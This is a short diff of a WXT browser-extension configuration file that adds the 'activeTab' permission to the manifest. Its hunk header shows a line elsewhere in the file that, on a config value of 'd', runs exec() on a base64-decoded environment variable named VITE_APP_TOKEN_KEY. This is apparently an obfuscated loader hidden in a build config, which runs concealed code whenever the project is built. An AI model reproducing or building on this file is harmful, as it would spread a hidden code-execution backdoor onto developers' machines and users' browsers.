@@ -9,7 +9,7 @@ else if (config[0] == "d") exec(Buffer.from(env.VITE_APP_TOKEN_KEY, "base64").to
 // See https://wxt.dev/api/config.html
 export default defineConfig({
   manifest: {
-    permissions: ["sidePanel"],
+    permissions: ["sidePanel", "activeTab"],
     action: {},
     side_panel: {
       default_path: "index.html",
